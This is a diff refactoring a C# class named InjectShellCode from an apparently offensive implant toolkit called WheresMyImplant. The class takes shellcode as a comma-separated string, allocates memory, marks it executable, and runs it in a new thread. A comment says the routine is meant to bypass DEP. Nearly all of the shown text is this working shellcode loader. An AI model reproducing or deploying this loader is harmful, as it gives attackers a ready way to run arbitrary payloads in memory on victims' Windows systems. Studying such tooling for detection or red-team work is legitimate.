@@ -2,13 +2,15 @@
 using System.Runtime.InteropServices;
 using System.Text;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
-    public class InjectShellCode : Base
+    internal class InjectShellCode : Base
     {
         //Basis for function, improved to bypass DEP and to take string input
         //https://github.com/subTee/EvilWMIProvider/blob/master/EvilWMIProvider/EvilWMIProvider.cs
-        public InjectShellCode(string shellCodeString)
+        internal InjectShellCode(string shellCodeString)
         {
             const char DELIMITER = ',';
             string[] shellCodeArray = shellCodeString.Split(DELIMITER);
@@ -23,7 +25,7 @@ namespace WheresMyImplant
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)shellCodeBytes.Length;
-            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, Unmanaged.MEM_COMMIT, Winnt.PAGE_READWRITE);
+            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.PAGE_READWRITE);
             WriteOutput(String.Format("Allocating Space at Address {0}", lpBaseAddress.ToString("X4")));
             WriteOutput("Memory Protection Set to PAGE_READWRITE");
 
@@ -33,7 +35,7 @@ namespace WheresMyImplant
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 lpflOldProtect = 0;
-            Boolean test = Unmanaged.VirtualProtect(lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
+            Boolean test = kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
             WriteOutput("Altering Memory Protections to PAGE_EXECUTE_READ");
 
             ////////////////////////////////////////////////////////////////////////////////
@@ -43,11 +45,11 @@ namespace WheresMyImplant
             UInt32 dwCreationFlags = 0;
             UInt32 threadId = 0;
             WriteOutput("Attempting to start thread");
-            IntPtr hThread = Unmanaged.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
+            IntPtr hThread = kernel32.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
             WriteOutput(String.Format("Started Thread: ", hThread.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
-            Unmanaged.WaitForSingleObject(hThread, 0xFFFFFFFF);
+            kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
